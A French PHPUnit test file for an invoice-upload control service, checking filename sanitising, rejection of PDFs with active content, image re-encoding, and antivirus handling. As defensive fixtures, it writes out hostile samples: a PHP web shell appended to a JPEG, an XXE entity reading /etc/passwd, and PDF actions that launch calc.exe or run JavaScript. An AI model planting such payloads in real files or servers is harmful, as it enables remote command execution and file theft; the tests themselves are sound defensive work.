<?php

namespace Tests\Feature\Fichiers;

use App\Domain\Fichiers\ControleDesFichiers;
use App\Domain\Fichiers\Enums\ContenuActif;
use App\Domain\Fichiers\Enums\RaisonDuRefus;
use App\Domain\Fichiers\Exceptions\FichierRefuseException;
use App\Domain\Fichiers\FichierControle;
use App\Domain\Fichiers\NomDeFichier;
use App\Domain\Fichiers\PieceDeposee;
use App\Integrations\Antivirus\AntivirusFactice;
use App\Integrations\Antivirus\AntivirusInjoignableException;
use App\Integrations\Antivirus\Contracts\Antivirus;
use App\Integrations\Antivirus\ResultatDeLAntivirus;
use Illuminate\Http\Request;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\Fixtures\FichiersDeTest;
use Tests\TestCase;

/**
 * Le contrôle de chaque fichier reçu (décisions de l'éditeur du 07/11/2026,
 * lot FI, Q-FI1 = a, Q-FI2 = a, voir ControleDesFichiers), sur de vrais
 * fichiers fabriqués par les tests : le nom réécrit avec l'extension du
 * type réel, les PDF lus en entier par qpdf et refusés au moindre code
 * actif, les photos réenregistrées sans leurs métadonnées, l'antivirus.
 */
class ControleDesFichiersTest extends TestCase
{
    /**
     * Le défaut bloquant du lot : un fichier « facture.bat » dont le
     * contenu est un PDF était accepté comme PDF et rendu sous le nom
     * « facture.bat », qu'un double-clic exécute sous Windows. Le nom
     * enregistré prend l'extension du type lu dans le contenu.
     */
    public function test_un_pdf_nomme_facture_bat_s_enregistre_sous_le_nom_facture_pdf(): void
    {
        $controle = $this->controler('facture.bat', FichiersDeTest::pdf());

        $this->assertSame(['facture.pdf', 'application/pdf'], [$controle->nom, $controle->type]);
        $this->assertSame('facture.bat', $controle->nomRecu);
    }

    /**
     * @return array<string, array{0: string, 1: string, 2: string}>
     */
    public static function nomsRecus(): array
    {
        return [
            'une autre extension finale' => ['facture.bat', 'application/pdf', 'facture.pdf'],
            'une double extension' => ['facture.pdf.exe', 'application/pdf', 'facture.pdf'],
            'un sens d\'écriture inversé' => ["facture\u{202E}fdp.exe", 'application/pdf', 'facturefdp.pdf'],
            'des caractères invisibles' => ["fac\u{200B}ture\u{FEFF}\u{2066}.pdf", 'application/pdf', 'facture.pdf'],
            'un nom réservé de Windows' => ['CON.pdf', 'application/pdf', '_CON.pdf'],
            'un nom réservé suivi d\'une extension' => ['lpt1.tar.gz', 'application/pdf', '_lpt1.tar.pdf'],
            'rien qu\'un chemin' => ['..', 'application/pdf', 'pièce.pdf'],
            'un chemin Windows' => ['C:\\Factures\\Mars\\avoir.PDF', 'application/pdf', 'avoir.pdf'],
            'des points et des espaces finaux' => ['facture . . ', 'application/pdf', 'facture.pdf'],
            'des caractères interdits par Windows' => ['a<b>c:d"e|f?g*h.jpg', 'image/jpeg', 'a_b_c_d_e_f_g_h.jpg'],
            'une autre écriture de JPEG' => ['photo.JPEG', 'image/jpeg', 'photo.jpg'],
            'un PNG nommé en PDF' => ['capture.pdf', 'image/png', 'capture.png'],
            'des octets qui ne sont pas de l\'UTF-8' => ["re\xFF\xFEcu.pdf", 'application/pdf', 're__cu.pdf'],
        ];
    }

    #[DataProvider('nomsRecus')]
    public function test_le_nom_enregistre_est_nettoye_et_prend_l_extension_du_type_reel(string $nomRecu, string $type, string $attendu): void
    {
        $this->assertSame($attendu, NomDeFichier::nettoyer($nomRecu, $type));
    }

    public function test_un_nom_tres_long_est_borne_sans_perdre_son_extension(): void
    {
        $nom = NomDeFichier::nettoyer(str_repeat('é', 300).'.pdf', 'application/pdf');

        $this->assertSame(str_repeat('é', NomDeFichier::LONGUEUR_MAXIMALE).'.pdf', $nom);
        $this->assertLessThanOrEqual(255, strlen($nom));
    }

    /**
     * L'en-tête d'un téléchargement porte un nom en ASCII sûr et le vrai
     * nom en UTF-8, toujours en pièce jointe.
     */
    public function test_l_en_tete_de_telechargement_porte_un_nom_ascii_et_le_nom_utf8(): void
    {
        $this->assertSame('attachment; filename="Grossiste du Nord n812.pdf"; filename*=utf-8\'\'Grossiste%20du%20Nord%20n%C2%B0812.pdf', NomDeFichier::enPieceJointe('Grossiste du Nord n°812.pdf'));
        $this->assertSame('attachment; filename=piece.pdf; filename*=utf-8\'\'pi%C3%A8ce.pdf', NomDeFichier::enPieceJointe('pièce.pdf'));
    }

    /**
     * @return array<string, array{0: string, 1: list<ContenuActif>}>
     */
    public static function pdfActifs(): array
    {
        return [
            'JavaScript en clair' => [FichiersDeTest::pdf('x', '/Names << /JavaScript << /Names [(ouverture) 5 0 R] >> >>', ['<< /S /JavaScript /JS (app.alert\\(1\\)) >>']), [ContenuActif::JavaScript]],
            'JavaScript au nom échappé' => [FichiersDeTest::pdf('x', '', ['<< /Type /Annot /Subtype /Link /A << /S /J#61vaScript /J#53 (app.alert\\(1\\)) >> >>']), [ContenuActif::JavaScript]],
            'action d\'ouverture en JavaScript' => [FichiersDeTest::pdf('x', '/OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >>'), [ContenuActif::JavaScript, ContenuActif::ActionAutomatique]],
            'lancement d\'un programme' => [FichiersDeTest::pdf('x', '', ['<< /Type /Annot /Subtype /Link /A << /S /Launch /F (calc.exe) >> >>']), [ContenuActif::LancementDeProgramme]],
            'formulaire qui s\'envoie' => [FichiersDeTest::pdf('x', '', ['<< /Type /Annot /Subtype /Widget /A << /S /SubmitForm /F (https://exemple.test/vol) >> >>']), [ContenuActif::EnvoiDeFormulaire]],
            'import de données' => [FichiersDeTest::pdf('x', '', ['<< /S /ImportData /F (donnees.fdf) >>']), [ContenuActif::EnvoiDeFormulaire]],
            'formulaire dynamique' => [FichiersDeTest::pdf('x', '/AcroForm << /Fields [] /XFA 5 0 R >>', ['<< /Length 0 >>'."\nstream\n\nendstream"]), [ContenuActif::FormulaireDynamique]],
            'contenu multimédia' => [FichiersDeTest::pdf('x', '', ['<< /Type /Annot /Subtype /RichMedia /RichMediaContent << >> >>']), [ContenuActif::ContenuMultimedia]],
            'lien vers un autre fichier' => [FichiersDeTest::pdf('x', '', ['<< /S /GoToR /F (autre.pdf) /D [0 /Fit] >>']), [ContenuActif::LienVersUnAutreFichier]],
            'action automatique vers un site' => [FichiersDeTest::pdf('x', '/OpenAction << /S /URI /URI (https://exemple.test) >>'), [ContenuActif::ActionAutomatique]],
            'action d\'ouverture suivie d\'une autre' => [FichiersDeTest::pdf('x', '/OpenAction << /S /GoTo /D [3 0 R /Fit] /Next << /S /URI /URI (https://exemple.test) >> >>'), [ContenuActif::ActionAutomatique]],
            'action à l\'affichage d\'une page' => [FichiersDeTest::pdf('x', '', ['<< /Type /Annot /Subtype /Widget /AA << /PO << /S /Named /N /Print >> >> >>']), [ContenuActif::ActionAutomatique]],
            'fichier joint exécutable' => [FichiersDeTest::pdf('x', '/Names << /EmbeddedFiles << /Names [(facture.exe) 5 0 R] >> >>', ['<< /Type /Filespec /F (facture.exe) /UF (facture.exe) /EF << /F 6 0 R >> >>', "<< /Type /EmbeddedFile /Subtype /application#2Fx-msdownload /Length 2 >>\nstream\nMZ\nendstream"]), [ContenuActif::FichierJoint]],
            'annotation de fichier joint' => [FichiersDeTest::pdf('x', '', ['<< /Type /Annot /Subtype /FileAttachment /FS (note.txt) >>']), [ContenuActif::FichierJoint]],
        ];
    }

    /**
     * @param  list<ContenuActif>  $contenus
     */
    #[DataProvider('pdfActifs')]
    public function test_un_pdf_qui_contient_du_code_actif_est_refuse_en_disant_pourquoi(string $pdf, array $contenus): void
    {
        $refus = $this->refus('facture.pdf', $pdf);

        $this->assertSame([RaisonDuRefus::PdfActif, $contenus], [$refus->raison, $refus->contenus]);
        $this->assertStringContainsString(RaisonDuRefus::COPIE_PROPRE, $refus->getMessage());
        $this->assertTrue($refus->raison->estDeSecurite());
    }

    /**
     * Le code caché dans un flux d'objets compressé, ou ajouté par une
     * mise à jour incrémentale, ou laissé dans une version précédente du
     * fichier, se voit comme ailleurs.
     */
    public function test_le_code_d_un_flux_d_objets_ou_d_une_mise_a_jour_incrementale_se_voit(): void
    {
        $compresse = FichiersDeTest::parQpdf(FichiersDeTest::pdf('x', '/OpenAction 5 0 R', ['<< /S /JavaScript /JS (app.alert\\(1\\)) >>']), ['--object-streams=generate']);
        $this->assertStringNotContainsString('JavaScript', $compresse, 'Le code est bien caché dans un flux compressé.');
        $this->assertSame([ContenuActif::JavaScript, ContenuActif::ActionAutomatique], $this->refus('compresse.pdf', $compresse)->contenus);

        $ajoute = FichiersDeTest::miseAJour(FichiersDeTest::pdf(), [1 => '<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>', 5 => '<< /S /JavaScript /JS (app.alert\\(1\\)) >>']);
        $this->assertSame([ContenuActif::JavaScript, ContenuActif::ActionAutomatique], $this->refus('ajoute.pdf', $ajoute)->contenus);

        $efface = FichiersDeTest::miseAJour(FichiersDeTest::pdf('x', '/OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >>'), [1 => '<< /Type /Catalog /Pages 2 0 R >>']);
        $this->assertSame([ContenuActif::JavaScript, ContenuActif::ActionAutomatique], $this->refus('efface.pdf', $efface)->contenus);

        $propre = FichiersDeTest::miseAJour(FichiersDeTest::pdf(), [5 => '<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://exemple.test) >> >>']);
        $this->assertSame('propre.pdf', $this->controler('propre.pdf', $propre)->nom);
    }

    /**
     * Une action d'ouverture qui n'est qu'une destination d'affichage, un
     * lien cliqué vers un site et le XML d'une Factur-X sont admis.
     */
    public function test_une_simple_destination_un_lien_et_une_facturx_sont_admis(): void
    {
        foreach ([
            '/OpenAction [3 0 R /Fit]',
            '/OpenAction (premiere-page)',
            '/OpenAction << /S /GoTo /D [3 0 R /XYZ 0 842 1] /Next << /S /GoTo /D [3 0 R /Fit] >> >>',
        ] as $ouverture) {
            $controle = $this->controler('facture.pdf', FichiersDeTest::pdf('x', $ouverture, ['<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://exemple.test) >> >>']));
            $this->assertSame('application/pdf', $controle->type, $ouverture);
        }

        $facturX = $this->facturX('<?xml version="1.0" encoding="UTF-8"?><rsm:CrossIndustryInvoice xmlns:rsm="urn:un:unece:uncefact:data:standard:CrossIndustryInvoice:100"><rsm:ExchangedDocument/></rsm:CrossIndustryInvoice>');
        $this->assertSame($facturX, $this->controler('FA-812.pdf', $facturX)->contenu, 'Un PDF admis se conserve tel que reçu.');
        $this->assertSame([ContenuActif::FichierJoint], $this->refus('zugferd.pdf', $this->facturX('<a/>', 'facture.xml'))->contenus, 'Seuls les noms normalisés de la Factur-X sont admis.');
        $this->assertSame([ContenuActif::FichierJoint], $this->refus('zugferd.pdf', $this->facturX('<a/>', 'factur-x.xml', 'application#2Fpdf'))->contenus, 'Seul un XML est admis.');
    }

    /**
     * Le XML d'une Factur-X est bien formé, sans DOCTYPE ni entité : lu
     * sans accès au réseau ni substitution d'entités.
     */
    public function test_une_facturx_dont_le_xml_a_un_doctype_ou_une_entite_est_refusee(): void
    {
        foreach ([
            '<?xml version="1.0"?><!DOCTYPE facture [<!ENTITY secret SYSTEM "file:///etc/passwd">]><facture>&secret;</facture>',
            '<?xml version="1.0"?><!DOCTYPE facture SYSTEM "https://exemple.test/facture.dtd"><facture/>',
            '<?xml version="1.0"?><facture>&inconnue;</facture>',
            '<?xml version="1.0"?><facture><non-fermee></facture>',
        ] as $xml) {
            $this->assertSame([ContenuActif::FichierJoint], $this->refus('facture.pdf', $this->facturX($xml))->contenus, $xml);
        }
    }

    /**
     * Un PDF chiffré sans mot de passe d'ouverture est déchiffré et lu en
     * entier ; avec un mot de passe d'ouverture, il est refusé.
     */
    public function test_un_pdf_chiffre_se_lit_sans_mot_de_passe_et_se_refuse_avec(): void
    {
        $sansMotDePasse = FichiersDeTest::parQpdf(FichiersDeTest::pdf(), ['--encrypt', '', 'proprietaire', '256', '--']);
        $this->assertSame('application/pdf', $this->controler('chiffre.pdf', $sansMotDePasse)->type);

        $actif = FichiersDeTest::parQpdf(FichiersDeTest::pdf('x', '/OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >>'), ['--encrypt', '', 'proprietaire', '256', '--']);
        $this->assertSame(RaisonDuRefus::PdfActif, $this->refus('chiffre-actif.pdf', $actif)->raison);

        $avecMotDePasse = FichiersDeTest::parQpdf(FichiersDeTest::pdf(), ['--encrypt', 'ouvrir', 'proprietaire', '256', '--']);
        $this->assertSame(RaisonDuRefus::PdfProtege, $this->refus('protege.pdf', $avecMotDePasse)->raison);
    }

    /**
     * Un PDF tronqué, ou suivi d'un contenu qui n'est pas du PDF (un
     * programme, une archive), ne se lit pas en entier.
     */
    public function test_un_pdf_tronque_ou_suivi_d_un_autre_contenu_est_refuse(): void
    {
        $this->assertSame(RaisonDuRefus::PdfIllisible, $this->refus('tronque.pdf', substr(FichiersDeTest::pdf(), 0, 300))->raison);
        $this->assertSame(RaisonDuRefus::PdfIllisible, $this->refus('suivi.pdf', FichiersDeTest::pdf()."MZ\x90\x00 un programme")->raison);
        $this->assertSame(RaisonDuRefus::PdfIllisible, $this->refus('abime.pdf', str_replace('xref', 'xrfe', FichiersDeTest::pdf()))->raison);
        $this->assertSame('application/pdf', $this->controler('blancs.pdf', FichiersDeTest::pdf()."\r\n\n  ")->type, 'Des blancs après la fin restent du PDF.');
    }

    /**
     * Une photo est décodée et réenregistrée : les données ajoutées après
     * l'image, l'EXIF et sa position GPS disparaissent ; l'empreinte du
     * fichier reçu reste pour le journal d'audit.
     */
    public function test_une_photo_est_reenregistree_sans_ses_metadonnees_ni_ses_donnees_ajoutees(): void
    {
        $recue = FichiersDeTest::avecExif(FichiersDeTest::jpeg(), gps: true).'PK<?php system($_GET["c"]); ?>';

        $controle = $this->controler('photo.jpg', $recue);

        $this->assertSame('image/jpeg', $controle->type);
        $this->assertStringNotContainsString('Exif', $controle->contenu);
        $this->assertStringNotContainsString('PiliqiPhone', $controle->contenu);
        $this->assertStringNotContainsString('<?php', $controle->contenu);
        $this->assertStringEndsWith("\xFF\xD9", $controle->contenu);
        $this->assertSame([hash('sha256', $recue), strlen($recue)], [$controle->empreinteRecue, $controle->tailleRecue]);
        $this->assertNotSame($controle->empreinteRecue, $controle->empreinte());
        $this->assertSame([40, 30], array_slice((array) getimagesizefromstring($controle->contenu), 0, 2));

        $png = $this->controler('capture.png', FichiersDeTest::png()."\x00\x00\x00\x00IEND donnees cachees");
        $this->assertSame('image/png', $png->type);
        $this->assertStringNotContainsString('donnees cachees', $png->contenu);
    }

    /**
     * L'orientation de l'appareil s'applique aux pixels, puisque l'EXIF ne
     * reste pas : le coin rouge, en haut à gauche de l'image enregistrée,
     * finit où l'appareil l'a vu.
     */
    public function test_l_orientation_de_l_appareil_est_appliquee(): void
    {
        $attendus = [
            1 => [40, 30, [0, 0]],
            2 => [40, 30, [39, 0]],
            3 => [40, 30, [39, 29]],
            4 => [40, 30, [0, 29]],
            5 => [30, 40, [0, 0]],
            6 => [30, 40, [29, 0]],
            7 => [30, 40, [29, 39]],
            8 => [30, 40, [0, 39]],
        ];

        foreach ($attendus as $orientation => [$largeur, $hauteur, [$x, $y]]) {
            $photo = $this->controler('photo.jpg', FichiersDeTest::avecExif(FichiersDeTest::jpeg(), $orientation))->contenu;

            $this->assertSame([$largeur, $hauteur], array_slice((array) getimagesizefromstring($photo), 0, 2), "Orientation {$orientation}");
            $this->assertSame('rouge', FichiersDeTest::couleur($photo, $x, $y), "Orientation {$orientation}");
        }
    }

    /**
     * Les dimensions se lisent dans l'en-tête avant tout décodage : une
     * image démesurée est refusée sans être décodée ; une image qui ne se
     * décode pas est refusée.
     */
    public function test_une_image_demesuree_ou_illisible_est_refusee(): void
    {
        $this->assertSame(RaisonDuRefus::ImageTropGrande, $this->refus('bombe.png', FichiersDeTest::enTetePng(100000, 100000))->raison);
        $this->assertSame(RaisonDuRefus::ImageTropGrande, $this->refus('bande.png', FichiersDeTest::enTetePng(20000, 2))->raison);
        $this->assertSame(RaisonDuRefus::ImageIllisible, $this->refus('vide.png', FichiersDeTest::enTetePng(10, 10))->raison);
        $this->assertSame(RaisonDuRefus::ImageIllisible, $this->refus('photo.jpg', "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00 pas une photo")->raison);
        $this->assertSame(RaisonDuRefus::ImageIllisible, $this->refus('abimee.png', substr_replace(FichiersDeTest::png(), str_repeat("\x00", 20), 45, 20))->raison);
    }

    /**
     * Le type se lit dans le contenu, jamais dans le nom ; un fichier vide
     * ou de plus de 10 Mo est refusé avant toute lecture.
     */
    public function test_un_autre_type_un_fichier_vide_ou_trop_gros_est_refuse(): void
    {
        $this->assertSame(RaisonDuRefus::Type, $this->refus('facture.pdf', "MZ\x90\x00 un programme")->raison);
        $this->assertSame(RaisonDuRefus::Type, $this->refus('page.html', '<html><body>%PDF-</body></html>')->raison);
        $this->assertSame(RaisonDuRefus::Vide, $this->refus('vide.pdf', '')->raison);
        $this->assertSame(RaisonDuRefus::TropGros, $this->refus('gros.pdf', str_repeat('x', ControleDesFichiers::TAILLE_MAXIMALE_EN_OCTETS + 1))->raison);
        $this->assertFalse(RaisonDuRefus::Vide->estDeSecurite());
        $this->assertTrue(RaisonDuRefus::Type->estDeSecurite());
    }

    /**
     * L'antivirus analyse le fichier tel que reçu, avant toute lecture :
     * le fichier de test EICAR est refusé par l'antivirus factice, même
     * nommé en PDF ; un antivirus injoignable refuse le dépôt, jamais
     * accepté sans analyse.
     */
    public function test_l_antivirus_refuse_une_menace_et_un_antivirus_injoignable_refuse_le_depot(): void
    {
        $menace = $this->refus('facture.pdf', AntivirusFactice::fichierDeTest());
        $this->assertSame([RaisonDuRefus::Menace, AntivirusFactice::MENACE], [$menace->raison, $menace->menace]);
        $eicar = AntivirusFactice::fichierDeTest();
        $this->assertSame(RaisonDuRefus::Menace, $this->refus('facture.pdf', FichiersDeTest::pdf('x', '', ['<< /Length '.strlen($eicar)." >>\nstream\n{$eicar}\nendstream"]))->raison);

        $this->app->instance(Antivirus::class, new class implements Antivirus
        {
            public function analyser(string $contenu): ResultatDeLAntivirus
            {
                throw new AntivirusInjoignableException('clamd est injoignable.');
            }

            public function description(): string
            {
                throw new AntivirusInjoignableException('clamd est injoignable.');
            }
        });

        $injoignable = $this->refus('facture.pdf', FichiersDeTest::pdf());
        $this->assertSame(RaisonDuRefus::AntivirusInjoignable, $injoignable->raison);
        $this->assertFalse($injoignable->raison->estDeSecurite());
        $this->assertStringContainsString('réessayez dans quelques minutes', $injoignable->getMessage());
    }

    /**
     * Demandé par l'API, le refus est une erreur 422 qui dit sa raison ;
     * ailleurs, l'écran le montre.
     */
    public function test_l_api_recoit_une_erreur_422_qui_dit_la_raison(): void
    {
        $refus = $this->refus('facture.bat', FichiersDeTest::pdf('x', '/OpenAction << /S /Launch /F (calc.exe) >>'));

        $reponse = $refus->render(Request::create('/api/factures-achat', 'POST', server: ['HTTP_ACCEPT' => 'application/json']));

        $this->assertSame(422, $reponse?->getStatusCode());
        $this->assertSame(['message' => $refus->getMessage(), 'raison' => 'pdf_actif'], $reponse->getData(true));
        $this->assertStringContainsString('le lancement d\'un programme et une action automatique à l\'ouverture', $refus->getMessage());
        $this->assertNull($refus->render(Request::create('/app')));
    }

    private function controler(string $nom, string $contenu): FichierControle
    {
        return app(ControleDesFichiers::class)->controler(new PieceDeposee($nom, $contenu));
    }

    private function refus(string $nom, string $contenu): FichierRefuseException
    {
        try {
            $this->controler($nom, $contenu);
        } catch (FichierRefuseException $refus) {
            $this->assertSame([$nom, hash('sha256', $contenu), strlen($contenu)], [$refus->nomRecu, $refus->empreinteRecue, $refus->tailleRecue]);

            return $refus;
        }

        $this->fail("Le fichier « {$nom} » devait être refusé.");
    }

    /**
     * Un PDF qui porte ce XML comme seul fichier joint, sous ce nom et ce
     * type.
     */
    private function facturX(string $xml, string $nom = 'factur-x.xml', string $type = 'text#2Fxml'): string
    {
        return FichiersDeTest::pdf('Facture FA-812', "/Names << /EmbeddedFiles << /Names [({$nom}) 5 0 R] >> >> /AF [5 0 R]", [
            "<< /Type /Filespec /F ({$nom}) /UF ({$nom}) /AFRelationship /Data /EF << /F 6 0 R /UF 6 0 R >> >>",
            FichiersDeTest::fluxCompresse($xml, "/Type /EmbeddedFile /Subtype /{$type}"),
        ]);
    }
}
